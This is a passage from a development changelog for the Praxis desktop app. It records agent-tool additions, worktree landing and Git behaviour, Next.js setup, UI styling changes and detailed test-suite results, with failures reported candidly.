preserving both intents and keeping markers out of the live checkout. Further
conflicts, failed/stopped turns, binary/add/delete/symlink batches, and existing
parks retain the manual recovery path. Detached agents are unchanged.

The chat stays busy through landing so queued messages cannot race it. Provider
responses finish streaming before landing, preserving the correct Revert target.
Automatic reconciliation has a short progress status; Stop, closed/replaced
sessions, and failed sends suppress or end the continuation without retry loops.
The same resolution prompt supports the explicit retry action.

Validation: typecheck/build, real-Git reconciliation and coordinator tests, message
queue/Revert tests, and Electron isolation/UI checks passed; screenshot inspected.
A real Codex turn with a competing live edit automatically reconciled both labels,
committed the result, and never showed the Resolve card. Full verify: 157/158
passed (including the normal fixture/simulator skips); only the previously recorded
agent-multi “This chat is already running” failure remains. The new live conflict
test passed separately. Final typecheck/build and targeted UI/queue tests also
passed after preserving Revert while the landing gate is held. Existing App.tsx
edits are unrelated and left out of this commit.

## 2026-09-17 — Open project pages from chat

Added `open_preview` to Claude's in-process tools and the Codex/custom-endpoint
MCP bridge, with shared provider instructions to open requested project pages.
The tool accepts a root-relative path, including query/hash, and reports a
navigation request rather than claiming the page has loaded. Detached agents
cannot navigate; external origins, parser escapes, and simulator routes are
excluded.

Desktop and browser transports route requests through the existing preview load
API. The renderer scopes requests to the active project/chat, waits for isolated
turns to land and the web preview to run, and drops requests after chat/project
switches, failed or parked turns, or a newer turn. This avoids opening a newly
authored route before its source reaches the served checkout.

Validation: typecheck, route-boundary tests, actual stdio MCP registration/calls,
and Electron navigation tests passed. The UI test checks path/query/hash,
landing waits, wrong-project/chat guards, and stale request cancellation; native
preview screenshot inspected. Real Claude and Codex turns both opened
`/article.html` on request, with the rendered article heading verified.
Full `verify`: 153/157 passed. The existing `agent-multi` failure reports
"This chat is already running"; `controls-agent` and `controls-codex` report
the provider session limit; `tool-invocation` made no tool calls. Next's opt-in
matrix and the simulator self-skipped without their fixture/Xcode configuration.
A final build/typecheck and targeted Electron rerun passed after adding the
new-turn cancellation guard. Unrelated setup hunks in App.tsx remain unstaged.

## 2026-09-17 — Dedicated Next setup and verifiable worktree helpers

Setup now detects Next separately from generic React, including installed version,
App/Pages/mixed routing, and the bundler selected by the dev script. A local
source loader and final-config wrapper support Turbopack and webpack without a
project Babel config or use-client changes. Existing wrappers/functions/async
exports are retained; overlapping Turbopack rules fail explicitly for composition.
A development-only remark helper maps MDX to authored Markdown positions. The
loader preserves directives/maps and carries instance stamps through ordinary
function components that destructure props without forwarding arbitrary attributes.
Production config bypasses the adapter and the transforms independently dev-gate.
Also fixed Next port forwarding: Bun/pnpm must not receive npm's extra `--`.

Traced the missing helper to worktree snapshots deliberately excluding `.praxis/`.
Setup's allowlisted helpers are now copied and SHA-256-verified before new sessions
and each existing chat turn, with a checkout-local manifest. No other sidecar data
is shared. Next worktrees install local dependencies using their package manager;
manifests/lockfile fingerprints trigger refreshes without broadening Turbopack's
root. Failed initial provisioning reclaims the new checkout. No-op setup turns
acknowledge landing so restoring a helper can proceed to verification.

Removed bulk component-typing instructions. Unresolved react-docgen inspection now
uses the TypeScript JSX signature, covering inline/named/inherited/imported types
and ComponentProps without editing source. Setup records phases and ignores
readiness from documents predating its verification window. Workspace tools expose
live revision/dirty state, checkout/base, URL, and stamp observations separately.
Exact served-commit attribution remains explicitly unknown, not inferred from HEAD.

Validation: typecheck/build, helper/detection/loader/production/map tests, real
worktree synchronization and no-op acknowledgement, TypeScript schema tests, and
worktree/live-commit regressions passed. Real Next 15.5.12 and 16.1.6 fixtures passed
both bundlers, Server/Client Components, distinct non-forwarding instances, a
workspace package, authored MDX stamps, inspector edit → HMR → refresh/navigation,
hydration-error checks, and production stamp absence. Native screenshots inspected.
Use PRAXIS_NEXT_FIXTURE with a disposable installed copy of test/fixtures/next-app;
the optional live-tier fixture test otherwise reports SKIP. Canonical paths and
waiting for HMR before testing persistence avoid alias/navigation races.

The full verify run reported 149/157. Isolated final-build reruns passed setup,
restart, project setup, chat isolation, history, simulator frame/control, sidebar,
custom controls, and startup. A temporary preview.load waiting change caused the
history/control failures and was reverted; navigation remains nonblocking.
All eight failed checks were rerun in isolation. Seven passed, including live
Claude/Codex code reveal; agent-multi still failed with “This chat is already
running,” also recorded before this change. The full run is not reported as green.

## 2026-09-17 — Native animation controls independent of selection

Replaced the bundled animation skill's DialKit integration at the user's request.
The skill now registers `presentation: "animation"` manifests through
`define_controls`, using Praxis's existing sliders, toggles, colors, selects, and
easing editor in a persistent dock beside the preview. No tuning dependency or
panel UI is installed in the target project. Panels survive selection changes,
can collapse/reopen, and reserve their own native-preview inset.

Animation parameters must use literal source anchors: selection-dependent prop
and style strategies are rejected. Changes use the existing source-write, HMR,
and Undo flow. Optional Replay sends a component-scoped window event through the
desktop preload or browser bridge; the skill wires the existing animation to it
with cleanup and reduced-motion behavior intact. Codex explicitly allows the
validated registration tool, matching Claude's existing allowlist. Gemini's
tool limitation remains documented rather than falling back to a dependency.

Added deterministic Electron coverage and replaced the DialKit live-agent test
with native registration, Replay, selection independence, source edits,
collapse/reopen, Undo, and dependency checks. The real Codex request passed all
checks, including Replay using the changed duration, with no package dependency
added. Inspected both deterministic and live-agent panel screenshots. Typecheck,
build, skill validation, and targeted logic/UI tests passed. Full `verify`:
153/155 passed; `agent-multi` failed with “This chat is already running” and
`code-reveal-agent` passed Claude but could not find the Codex provider-menu option.
Other live controls tests and tool invocation passed. Concurrent setup edits were
present near the end of the run and are excluded from this change.

## 2026-09-17 — Git updates dialog above the native preview

Transfer the branch menu's existing preview freeze directly to Git updates.
Preventing Radix's automatic selection close avoids releasing the shared freeze
after the dialog has opened, which let the native WebContentsView cover it.
Closing the dialog still restores the live preview.

The Git updates UI regression now waits for a live native preview and checks
actual main-process visibility while the dialog is open, after viewport changes
and a pull/restart, and after closing. It failed on the original code and passes
with the handoff fix. Typecheck/build passed; inspected desktop and narrow-window
screenshots. Full unit/UI suite: 140/144 passed; startup-intro, agent-multi,
spawn-comment, and prop-edit-svelte failed outside the Git updates test. The suite
ran while concurrent animation-controls edits were present in the shared workspace.
## 2026-09-17 — Merge and reconcile candidate updates

Integrated remote candidate features while retaining native composer pickers,
provider-switch synchronization, and the local cat-timer regression fix. Preserved
both task-log histories, ordered recent progress entries newest-first, and kept
chat-render's page-error handler failing the test. Updated the remote desktop
surface regression to exercise the project action menu because composer pickers
remain native selects.

Type checks and all 144 unit/Electron tests pass; inspected the light-theme menu
screenshot. The optional spawn-comment live portion self-skipped after no edit
landed. No provider or simulator implementation was changed during resolution.

## 2026-09-17 — Show exact code from chat

Added `open_code` to Claude's in-process tools and the Codex/custom-endpoint MCP
bridge. Shared rules route requests to see code into the existing mini editor:
read the source, specify the repo-relative file and inclusive line range, open it,
and highlight only those lines. Preview selection is not required or changed.

Main captures the exact source text from the agent checkout and validates file,
range, size, and symlink boundaries. The renderer scopes requests to the active
project/chat, verifies the captured text against the live checkout, relocates a
unique match when lines shift, and retries after landing. Unsaved drafts defer
navigation until saved/discarded. Detached agents cannot navigate the editor.
The same event contract is exposed in browser mode.

A real Codex probe also found that its MCP entrypoint was resolved against
Electron's `app.getAppPath()` (`out/main` in source launches), producing a missing
`out/main/bin` path. It now resolves the bundled bridge from the compiled main
module, as the existing plugin/skills paths do. Its headless SDK session explicitly
allows only the validated `open_code` navigation tool through the documented
per-tool approval setting; unrelated tool policies are unchanged.

Validation: typecheck/build, exact-range/path unit tests, actual stdio MCP tool
registration/invocation, and editor UI tests passed. The UI test verifies precise
highlighting without selection, ignores another chat's request, and preserves an
unsaved draft before revealing queued code after Undo. A simulated landing also
verified deferred reveal and relocation. A real Codex turn opened `invoice.js`
and highlighted exactly the requested function; screenshot inspected. Claude's
live probe was skipped because its account had reached the session usage limit.
Full `verify`: 148/154 passed, including all 144 unit/UI checks and the new live
Codex reveal test. Six other live-provider probes failed during the exhausted
Claude session; simulator skipped without Xcode. These are recorded as failures,
not a green full verification run.

## 2026-09-17 — Animation controls independent of selection

Added the bundled `/animation-controls` skill and natural-language routing for
“surface animation controls.” It builds a development-only DialKit panel inside
the target project, wired to the existing animation and stable across selection
changes, clearing selection, and Replay. Existing tuning UI is reused; unsupported
frameworks can use a small native equivalent. Live values remain distinct from
saved source defaults. The animation action and spring skill use this workflow;
explicit selection-inspector requests retain `define_controls`/`open_controls`.

Claude exposes a short portable skill alias; Codex/Gemini discover the same bundled
skill as a fallback behind project/user skills. DialKit roots and custom panels
marked `data-praxis-controls` remain interactive while Select mode is armed in
both native and browser previews.

Validation: typecheck/build, skill validation, provider discovery/precedence,
rules, docs links, skill-menu UI, and trusted preview selection/control clicks
passed. Inspected native-preview and skill-menu screenshots. Three real Codex turns
surfaced the panel with no selection; the stronger test verified changed duration,
repeatable Replay, retained values after selection changes/clear, and a production
build with working motion and no tuning panel. Full unit/UI suite: 142/143 passed;
startup-intro failed its unrelated startup timing check and the focused rerun
failed the crossfade/native-preview assertion. Browser-mode integration passed.
The live tier passed the new skill, model switching, both providers’ file edits
and existing inspector controls, and CSS provenance; simulator skipped without
Xcode. The tool-invocation probe missed its `line_height` call; the focused
rerun missed both `check_contrast` and `line_height`. These broader failures
remain unresolved; no animation/control-specific regression failed.

## 2026-09-17 — Group selection, queued messages, and preview recovery

Shift-click adds/removes explicitly selected DOM objects in desktop and browser
previews, retaining their outlines and a selection count. Prompts and Delete
carry every selected object; individual inspector controls retain the most recent
object as their target. Plain clicks replace the group; clearing drops all picks.

The composer now queues follow-ups per chat, capturing attachments and selection
context when submitted. FIFO dispatch continues in background chats, preserves
session identity across attachment saves/project switches, and waits for prior
landing. Stop/errors pause pending messages, conflict states block dispatch, and
users can remove items or resume. Cancellation also prevents late sends during
attachment saving or turn preparation. Queues are in memory and clear on close.

Routine merge notes are removed; Revert attaches to the completed response even
when a queued turn starts before its merge notification. Chat links open separately,
desktop renderer navigation cannot replace Praxis, and Back to project restores
the project's entry URL. Existing preview origin guards remain in force.

Validation: typecheck, build, focused lint, queue/context/cancellation unit tests,
and docs links pass. The full desktop suite passed 141/143: startup-intro retains
its documented timeout; agent-multi exposed an interrupt-completion timing assumption.
That test now awaits the terminal state and passes. All six final-build targeted
checks pass (chat-render, select-element, preview-iframe-navigation, chat-isolation,
agent-multi, browser-mode). Inspected composer, grouped selection outlines, and
preview home-button screenshots. The live tier completed 8/8 with no failures:
real Claude/Codex edits, model handoff, controls, tools, and style provenance pass;
the simulator check skipped because Xcode is unavailable. Tool-only completed
responses also retain Revert without needing a merge note.

## 2026-09-17 — Consistent sidebar hover surfaces

Project headers and the Open/New project actions now share the chat row's
translucent hover fill. Project headers use the matching 6px radius token, and
one shared rail-hover stylesheet keeps the three selectors in sync. Existing
chat selection styling and project action icon behavior remain intact.

Validation: typecheck and sidebar/chat checks pass; inspected project/action/chat
hover captures in light and dark themes. The full suite passed 140/142; the
folder-icon animation and comment branch cleanup checks both pass on isolated
reruns. The inherited 12px regular rail text remains below the
APCA lookup's size recommendation (approximate opaque hover surfaces: Lc 72 light,
58 dark); this change preserves the requested chat palette and typography.

## 2026-09-17 — Compact chat composer spacing

The composer now uses 8px content and toolbar insets, with matching space above,
left of, and below attached files. Send and Stop use the shared 28px size token.
The draft scrollbar is hidden while long drafts retain wheel/keyboard scrolling
and the existing six-line height cap. Padding and button dimensions use Tailwind
utilities rather than the legacy CSS rules.

Validation: typecheck passes; inspected attached-file and narrow-composer captures
from the passing chat-render check. The full suite passed 140/142: startup-intro
timed out waiting for its fade phase, and spawn-comment failed a branch-cleanup
assertion. The isolated spawn-comment rerun passes. The first sandboxed suite could not
launch Electron; the reported full run used the required desktop access.

## 2026-09-17 — Refresh previews after ordinary local branch switches

The local branch dropdown and named work-branch switch now request an environment
refresh after successful checkout. Previously these paths only updated the branch
label, leaving the old server and preview running. Each switch restarts the managed
preview with fresh framework detection; branch-tip manifest/lockfile differences
request dependency installation, including files removed by the destination branch.
An unavailable comparison conservatively requests installation. Failed switches
leave the preview alone. Attached external servers get a page reload and an explicit
manual-server-restart message. Custom launch commands remain preserved.

Regression coverage switches back through the ordinary branch menu and verifies
that the restarted server serves the destination branch. Git unit checks cover
manifest differences in both directions and failed checkout. Typecheck and focused
Git logic/UI checks pass. The full suite passed 138/142 initially: the expanded
Git test needed to wait for the busy remote dialog before closing it, and startup,
rail-animation, and layers-panel checks failed. After correcting that test wait,
the final build passes the Git test (including native preview content), rail, and
layers isolated reruns. The previously recorded startup-intro failure remains
open. Docs links and diff whitespace checks pass.

## 2026-09-16 — Harden reduced-motion cat regression

The prior Electron window closure did not reproduce in the original focused
run. Replaced its final 31-second sleep with observation of real idle timers:
normal rest schedules one, reduced-motion completion schedules none, and enabling
reduced motion during rest cancels the pending timer. Frame timings and the real
idle-animation check remain unchanged; application code is untouched.

Type checks, focused cat test, and the full unit/Electron suite pass (133/133).
Inspected the idle screenshot. The optional spawn-comment live portion self-skipped
after no edit landed. The cause of the earlier window closure remains unconfirmed;
the revised test removes the long wait where it occurred and strengthens timer
cleanup coverage.

## 2026-09-16 — Pull latest candidate updates

Merged origin/candidate's sentence-case sidebar headings while preserving local
main integration and regression fixes. Restored newest-first progress-log order.
Type checks pass; full unit/Electron suite: 132/133 passed. Cat-animations lost
its Electron window during a wait; the optional spawn-comment live portion
self-skipped after no edit landed. Rail/history checks pass; inspected the rail
screenshot. No merge conflicts.

## 2026-09-16 — Sentence-case rail headings

Dropped the all-caps treatment (and its caps-only letter-spacing) from the
sidebar's "Projects" heading and the per-project "History" toggle. The history
label's 9px size only worked in caps — lowercase at that size loses too much
x-height — so it moves to 10px, an existing value in the de facto type scale.
`bun run typecheck` passes; rail and history-ui Electron screenshots inspected.

## 2026-09-16 — Fetch, pull, and switch remote project branches

The current-branch menu now opens Git updates in desktop and browser mode.
Fetch discovers/prunes remote branches without changing project files. Pull
fetches the selected remote and merges its branch into the current branch,
preserving local commits. Switch creates a tracking branch or opens an existing
local branch without resetting it. Successful file changes refresh the preview;
manifest and lockfile changes also request dependency installation.

Repository writes use the existing queue. Updates reject active project agents,
stale branch selections, dirty project files, and unfinished Git operations.
Conflicting pulls abort their merge back to the clean starting checkout. Browser
commands remain scoped to the opened repository. Runtime sidecars do not block
updates; Git still protects untracked file collisions.

Validation: typecheck/build and real bare-remote unit regressions pass, including
divergent commits, conflict recovery, dirty/busy guards, remote pruning, existing
local branch preservation, and an unavailable unrelated remote. The full suite
passed 141/142 checks; startup-intro failed its existing localhost-only native
view lookup. A diagnostic rerun accepting all loopback hosts also exposed a
preview-width failure during the intro fade; this unrelated issue remains open.
Final targeted Git UI and browser-mode checks cover fetch-only behavior, pull,
tracking checkout, automatic preview refresh, and repository scope. Inspected
Git dialog captures at narrow/tablet/desktop widths and the native preview.

## 2026-09-16 — Choose project setup before scaffolding; recover environment previews

New Project now asks how to start before writing application files: use the
React/TypeScript/Vite defaults, plan Next.js or Svelte, or discuss a custom
setup. Discussion paths create only an empty Git repository with ignores and
open the selected provider's chat with the user's preferences. Shared provider
rules ask about unresolved choices before scaffolding; empty projects avoid
premature launch errors and token-scaffold offers. Preview startup failures keep
chat available for repair, and retry preserves the conversation.

Managed web previews now respond to authoritative landed environment changes,
not the earlier provider terminal event. Manifest/lockfile changes install in
the live checkout through its repository write queue; config changes restart
with fresh framework/package-manager detection. Explicit packageManager fields
win over stale migration lockfiles. Custom launch commands stay intact,
background projects defer refresh until activated, and cancelled starts cannot
launch after a dependency install finishes. The first landed HTML app can start
a previously empty preview too. Instrumentation setup waits for landing before
verification; failed/parked turns do not restart the preview.

Validation: typecheck/build, new-file lint, scaffold/environment unit checks,
and all 140 unit/Electron tests pass. Expanded final project-setup regression
also covers custom-command retries, background deferral, initially broken
projects, and static recovery. Inspected setup screenshots at 390/768/1440px,
empty-chat UI, and the native preview capture. The framework-switch regression
uses local package fixtures to test detection/install/relaunch without network
framework downloads. Seven live checks pass (real Claude/Codex turns, controls,
model switching, tool invocation, and style provenance); simulator e2e skips
because Xcode is unavailable. Existing large-file lint findings match HEAD
(40 errors in the inspected baseline and working files); new modules lint clean.

## 2026-09-16 — Keep subagent tooltips clear of the preview

Cat tooltips now align to the trigger's right edge and use the chat pane as
their collision boundary. Their maximum width also respects the available
space, keeping long operation labels from extending beneath the native preview.
Extended the rail status regression with long labels and chat-bound checks for
hover and keyboard focus; visually inspected the captures. Typecheck and the
full unit/Electron suite pass (138/138). Targeted lint reports the pre-existing
generic div's aria-label warning in SubagentCats.

## 2026-09-15 — Fix chat-render and provider-skills-menu regressions

The chat-render timeout hid a renderer exception: its synthetic per-chat settings
omitted required permissionMode, passing undefined into the native composer's
label formatter. Completed all three fixture tuples and report page errors as
explicit test failures. Application settings already supply this required field.
The skills-menu test now waits for the provider restart to commit Codex before
asserting skill discovery, instead of reading the old provider immediately.

Both focused regressions pass; inspected the skills-menu screenshot. Type checks
pass. Full unit/Electron suite: 132/133 passed, including both repaired tests.
The unrelated spawn-comment live check raced branch cleanup; its isolated rerun
passed the real agent edit and branch-deletion assertions. No application code
changed.

## 2026-09-15 — Reconcile latest remote main

Merged remote focus-ring, cursor, and cat-animation updates with the local
native composer picker restoration. Preserved both sides of the task-log
conflict and repaired a silently misaligned progress-log heading/body merge.

Type checks pass. Full unit/Electron suite: 131/133 passed; remaining failures
are the previously documented chat-render timeout and provider-skills-menu
provider assertion. Startup and cat-animation tests pass; inspected the thinking
cat screenshot. Remote candidate is an ancestor of the combined main history.

## 2026-09-15 — Settings chevron spacing

The default-model field now uses an inset decorative chevron instead of the
browser-drawn arrow hugging its right edge. The native select retains its
keyboard and popup behavior; extra right padding keeps long labels clear of the
icon. Extended desktop-surface captures to show project actions in both themes,
and wait for Radix's post-animation focus restoration before asserting it.
Typecheck, build, focused lint/UI checks, and the full suite pass (138/138).

## 2026-09-15 — Desktop dialogs, menus, and settings

Shared Radix dialogs and dropdowns now use quiet opaque surfaces with a fine
rim, broad shadow, and quick fades (reduced-motion aware). Dialogs use a lighter
scrim, compact titles and controls, a circular close affordance, and bounded
scrolling. Dropdowns and submenus share rounded selection rows, inset separators,
checkmarks, and the same light/dark surface treatment. Surface tokens live in
`src/renderer/src/components/ui/desktop-surfaces.css` and remain scoped to floating
UI, preserving the app shell and native preview freeze contract.

Settings is a compact preferences window with a persistent header, grouped
model/connection controls, and a scrollable form body. Removed the single-tab
strip and lengthy introductory paragraph. History review now uses the shared
Radix dialog, gaining focus containment and consistent dismissal while keeping
its native-preview freeze and session actions.

Added `desktop-surfaces` to the Electron tier: light/dark screenshots, menu
keyboard focus and Escape restoration, short-window form scrolling, and
unsaved-key disposal when leaving a connection form. Checked surface-description
contrast at 15px/500 in both themes (APCA Lc 96.6 and 95.1). Typecheck,
build, targeted lint, and the full unit/Electron suite pass (138/138).

## 2026-09-15 — Fix chat-render regression fixture

The per-chat model-switch fixtures omitted the required `permissionMode` from
both stored chats and the active session. Restoring those synthetic settings
set the permission picker label to undefined, crashing `ComposerSelect` and
leaving a blank renderer; the visible failure was a timeout waiting for sidebar
chat rows. Supply `auto` for all three settings objects and report renderer
`pageerror` stacks in the test log so future crashes expose their cause.

The focused `chat-render` test, `bun run typecheck`, and the complete
`bun run test` suite pass (137/137). Visually checked the model-switch approval
screenshot with both peer chats and the Auto picker.

## 2026-09-15 — Persistent sidebar ordering

Project names now drag entire sidebar groups; live chats and History rows reorder
within their own project/list. Native lifted drag images and before/after lines
show the destination, edge hovering scrolls long lists, and Escape/outside drops
cancel without writing an order. Alt+Up/Down reorders focused names, retains
focus, and announces moves/cancellation. Rename and close remain separate buttons.
Mounted chat-list unfold animations are settled before dragging so Chromium
cannot replay them while a project group moves under the pointer.

Manual order lives in a dedicated versioned localStorage store, independently of
workspace project arrays, sessionKeys, active-session selection, and LRU stamps.
New chats appear first without disturbing the established order; missing entries
are filtered. Renderer reloads rehydrate the display order without changing
provider session ownership or the running preview. History and live sessions
remain separate groups and cross-project drops are rejected.

Validation: type checks, build, targeted Biome checks, docs links, pure ordering
cases, and the new Electron regression pass. The native regression covers project,
chat, and History drops; keyboard focus; cancellation; lifecycle invariants;
rename; reload persistence; new entries; and edge scrolling. Native drag tests
keep the window inside the display and sustain the edge hover for macOS input
delivery. Inspected reordered/drag screenshots and used agent-browser to verify
keyboard moves and sidebar layouts at 390/768/1440px in light/dark themes. Ghost
text passes APCA at 15px/600. Full unit/Electron suite: 136/137 passed; the only
failure is the previously documented chat-render timeout.

## 2026-09-15 — Desktop 3D component inspector

On `candidate`, updated by fast-forward from `main`, the selection toolbar now
opens an isolated 3D workspace. Paint-only copies of the selected DOM subtree
separate by nesting depth, with orbit/pan/zoom, separation, front/reset, and a
keyboard-accessible layer selector. Clicking a surface opens the existing
inspector against its original live element. Style previews, source commits,
and undo reuse the established editing path; returning to the page does not
navigate or remount it.

The workspace stays in the sandboxed preview preload, using a modal shadow root
and CSS perspective without a new rendering dependency or IPC contract. Text is
captured once per owning element; SVGs render in inert image context and canvas
snapshots are bounded. Observers refresh changed surfaces. HMR recovery requires
an unambiguous ID/source identity; removed or repeated instances cannot redirect
style edits to a sibling. Capture limits and simplified effects are disclosed.
`docs/THREE_D.md` documents controls, architecture, and the first-version limits;
pseudo-elements, clipping/transforms, portals, and browser parity remain follow-ups.

Validation: type checks, build, new-file Biome checks, and documentation links
pass. Full unit/Electron suite: 134/135 passed; the only failure is the previously
documented chat-render timeout. The new native regression covers trusted camera
input, child selection, live style preview/clear, source edit/undo, simulated HMR
subtree replacement, preserved route/scroll/application state, Escape, capture
limits, and ambiguous identity protection. Inspected native screenshots and used
agent-browser at 390/768/1440px, including keyboard separation adjustment. New
control text passes APCA at its authored 15px/600 sizing.

## 2026-09-14 — Agent-opened controls and authored inspector fields

Claude, Codex, and custom-endpoint agents can now request selection and open the
Props, Styles, or Custom inspector with `open_controls`. `define_controls` shares
one validated registration path across harnesses, checks anchors in the private
worktree, persists to the live root, and requests the Custom tab. The renderer
uses the real Layers selection path, retries missing targets after landing, avoids
ambiguous file matches, and cancels pending requests when the project changes.
Existing selections can be reopened directly. Experimental Gemini retains its
prop-based fallback; this feature targets the desktop inspector.

Props default to present values and component defaults (including zero, false,
empty strings, and expressions). Optional absent fields remain under Show all.
Numeric props use the existing keyboard/pointer scrub control with exact-value
entry. Styles default to matched stylesheet/inline declarations, with computed
browser defaults under Show all. Authored field presence is separate from the
transient value readout so committing an edit cannot hide its row. No new
animation dependency was added; custom controls expose parameters using the
project's existing animation implementation.

Validation: type checks and build pass. Full unit/Electron run: 131/134 passed;
two older inspector assertions assumed always-visible groups/number inputs and
were updated, with affected tests passing on rerun. The remaining failure is the
known chat-render timeout. All seven existing live checks passed (simulator
self-skipped without Xcode), plus a new real Codex control-registration/landing
regression passed. Inspected native panel screenshots, verified a Scale keyboard
nudge through agent-browser, and checked panel layouts at 390/768/1440px.

## 2026-09-14 — Required agent-browser workflow

Operating rules v13 require agent-browser for web UI/browser verification when
available across all providers. Agents check their execution PATH and CLI help,
use an isolated named session, and test layout changes at phone/tablet/desktop
sizes with screenshot inspection and interaction checks. Missing CLI/browser
support requires an honest blocker report and permission before installation.
Explicit user tool choices still win. A stale preview cannot verify unlanded
worktree edits; agents must report pending verification and preserve the landing
lifecycle. README and provider docs describe this prompt-level requirement and
the need to recreate existing sessions for updated rules.

Type checks and the expanded rule tests pass across provider capability variants.
Full verification: 139/140 runner passes, with only the previously documented
chat-render timeout. Real model-switch, Claude/Codex edit, controls, and tool
invocation checks passed. Simulator e2e self-skipped because Xcode is unavailable.

## 2026-09-14 — Optional agent-browser installation

The installer recommends agent-browser for browser and responsive-layout checks
and offers an explicit default-No global CLI plus browser install. It reads from
the controlling terminal so the curl-pipe flow works, skips when the CLI is
already on PATH or no terminal exists, and prints manual installation commands
when declined. Optional failures leave Praxis installed. Bun global binaries
outside PATH can still finish browser setup, with a PATH reminder. README now
documents the offer.

Shell syntax and type checks pass. Nine mocked full-installer cases pass,
including piped input with a real pseudo-terminal: accept, decline, empty default,
unattended, existing CLI, CLI failure, browser failure, npm fallback, and Bun's
global bin outside PATH. No external packages were installed during these checks.
Full unit/Electron suite: 130/133 passed; startup-intro, chat-render, and
layers-panel failed. The first sandboxed run could not bind test servers or
launch Electron; the reported result is from the rerun with the required access.

## 2026-09-14 — Simultaneous startup cat reveal

Removed contour-order timing and blur variation from the startup cat. All 21
shapes now share one opacity/blur progression, so the artwork emerges together.
Preserved the four-second reveal, final sharpening, and 500ms app crossfade.

Type checks and build pass. Verified identical computed opacity and blur on all
21 contours midway through the reveal and inspected the screenshot. Startup-intro
passes, including reload preview suppression and reduced motion. Full suite:
131/133 passed; chat-render hit its known timeout and layers-panel failed its
focused-text-field undo assertion. The initial sandbox run could not launch
Electron; the full result above is from the run with the required access.

## 2026-09-14 — System-accent focus rings

The chat rows were inheriting Chromium's orange `outline: auto`, which paints a
white edge as well. Native clickable controls now use one solid 2px `AccentColor`
outline on focus-visible, inset to avoid sidebar clipping. Shared light/dark
focus tokens use the same system color; Tailwind ring shadows are suppressed on
these controls to avoid a second ring.

Type checks and build pass. Full unit/Electron suite: 132/133 passed, with only
the known chat-render timeout. Rebuilt after the inset adjustment, verified
computed outline color/style/width against CSS AccentColor in both themes, and
inspected both final screenshots: a complete blue ring with no white edge.

## 2026-09-14 — Arrow cursors across controls and transparent chat actions

Extended the arrow cursor to selects, links/source navigation, annotation pins,
and shared native clickable controls. CodeMirror folding controls get a scoped
CSS override, and the file tree gets its own shadow-DOM style override. Removed
the background fill on chat rename/close hover while preserving the icon color
change. Text-editing and resizing cursors retain their interaction cues.

Type checks and build pass. Full unit/Electron suite: 132/133 passed, with only
the previously documented chat-render timeout. After the final editor overrides,
rebuilt and verified eight fold controls and twelve shadow-DOM file rows use the
arrow. Both hovered chat actions compute a transparent background and default
cursor; inspected the hover screenshot.

## 2026-09-12 — Cat activity animation pack

Saved all 12 supplied animations (60 original SVG frames, 12 timing manifests,
and README) under the cat assets, unchanged. The composer cat loops think while
its chat has a pending question, plays idle once after each randomized 15–30
second rest, and jumps once on an active turn's completion. Existing working
sprites remain in use. Error/Stop completions do not jump, chat switches reset
playback, and reduced motion freezes sprites and disables idle/jump timers.
Only the three newly used animations are imported into the renderer bundle.

Type checks and focused lint pass. The new Electron regression passes for
question/resume, jump/rest, occasional idle, error/Stop/background completion,
and reduced motion; inspected all three animation screenshots. The full suite
reported 130/133 passing: the new test initially hit Electron's unsupported
Playwright clock API, then passed separately after switching to real timers;
startup-intro also passed on an isolated fresh-profile rerun. The previously
documented chat-render failure remains.

## 2026-09-12 — Default arrow on buttons

Replaced pointer cursors with the default arrow for shell buttons, expandable
chat messages, editor search controls, and the preview overlay's action/submit
buttons. Kept non-button cursor behavior (links, selects, annotation pins, and
resize/text controls) intact.

Type checks and build pass. Verified computed cursors on 15 visible shell
buttons and inspected the smoke screenshot; editor-search passes separately.
Full unit/Electron suite: 131/132 passed, with only the previously documented
chat-render timeout. The initial sandboxed run could not launch Electron or
bind test servers; reran with the required access.

## 2026-09-12 — Merge local and remote main

Merged origin/main into local main, preserving the native composer pickers and
remote joined startup contours/test-intro bypass. Git merged without conflict
markers; reordered the combined recent progress entries newest-first.

Type checks pass. Full unit/Electron suite: 130/132 passed, with the previously
documented chat-render timeout and provider-skills-menu provider assertion.
Startup-intro and smoke pass; inspected the completed startup screenshot.
The suite required an unsandboxed run for Electron and local test servers.

## 2026-09-12 — Joined startup cat contours

Replaced the 60 separate startup squares with the supplied load.svg's 21
contours, preserving its unioned bars and stepped shapes. Each contour animates
as one piece through the existing reveal and crossfade. Kept the silhouette
centered after the artwork's coordinates moved to whole SVG units.

Type checks and the startup Electron test pass; inspected intermediate and final
screenshots. Updated the shape-count assertion and waited for the asynchronous
reduced-motion update before asserting dismissal, fixing the recorded test race.
Full suite: 130/132 passed. The recorded chat-render timeout remains, and the
code-drawer drag assertion (300 → 300) also fails in an isolated rerun.

## 2026-09-12 — Skip startup intro in ordinary test runs

The suite now passes PRAXIS_TEST_SKIP_INTRO=1 for ordinary tests and explicitly
sets it to 0 for startup-intro. Desktop main forwards the switch as a renderer
query parameter, bypassing the intro wrapper while retaining fresh app/profile
isolation and all other UI motion. Targeted scripts can opt in with the same
environment variable; README documents the command.

Type checks pass. Full unit/Electron suite: 131/132 passed, with only the
previously documented chat-render timeout. Startup-intro passes with animation
enabled; smoke asserts the wrapper is bypassed. Inspected its launch screenshot.

## 2026-09-11 — Correct dropdown scope; restore composer pickers

The user clarified that provider, model, and permission pickers should retain
their original native menus. Reversed only the composer migration and its test
adaptations, preserving intervening work. The existing branch, publish, and
project action menus retain the shared shadcn styling improvements (softer
corners/shadow and selection checkmarks). Motion remains the next step for
those menus only.

Type checks pass. Visually verified native composer selects alongside the existing
project action menu. Full suite: 129/132 passed; code-drawer passes on a separate
rerun, leaving the documented chat-render and provider-skills-menu failures.
## 2026-09-11 — Quiet project action icons

Changed the sidebar project menu and new-chat icons to neutral gray at rest and
black on hover. Removed their accent hover background while retaining keyboard
focus outlines and the existing project-hover visibility behavior. Type checks
pass; verified computed colors/transparency for both buttons and inspected the
hover screenshot (with a gray backing for Electron's transparent capture).

Full suite: 128/132 passed. Layers-panel passes separately. Startup reduced-
motion assertion also fails separately; chat-render and provider-skills-menu
retain their previously documented failures.

## 2026-09-11 — Svelte inspector defaults

Preserved literal defaults from Svelte 5 `$props()` and Svelte 4 `export let`,
including negative numbers and falsy values. Prop rows display explicit values
before defaults, compare commits against the displayed value, and refresh when
the default changes. Defaults remain separate from attributes, so only explicit
overrides offer Reset. Expression defaults stay unevaluated and use edit via
chat; definition edits retain the existing default-edit agent route.

Extended the Svelte Electron regression with the CodeBlock copy-button example,
legacy declarations, mounted-field refresh, explicit overrides, expressions,
unchanged blur, and edit/reset source verification. Type checks and the focused
Electron test pass; inspected the floating-inspector screenshot.

